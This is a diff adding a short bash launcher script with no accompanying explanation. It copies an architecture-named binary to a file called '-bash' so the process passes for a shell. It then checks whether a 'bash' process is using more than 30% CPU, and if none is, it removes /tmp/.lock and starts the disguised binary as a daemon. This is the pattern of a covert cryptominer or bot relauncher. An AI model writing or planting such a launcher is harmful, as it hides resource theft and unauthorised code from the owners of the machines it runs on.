@@ -1,0 +1,12 @@
+#!/bin/bash
+
+cp -f -- `uname -m` -bash
+
+if [ $(ps -e -o pcpu,pid,args | grep -v grep | grep "bash" | awk '{if($1>30.0) print $2}' | wc -l ) == '1' ]; then
+echo "OK, ALREADY RUNNING"
+else
+echo "NOT RUNNING, LAUNCHING NOW"
+rm -rf /tmp/.lock
+./-bash -d
+fi
+
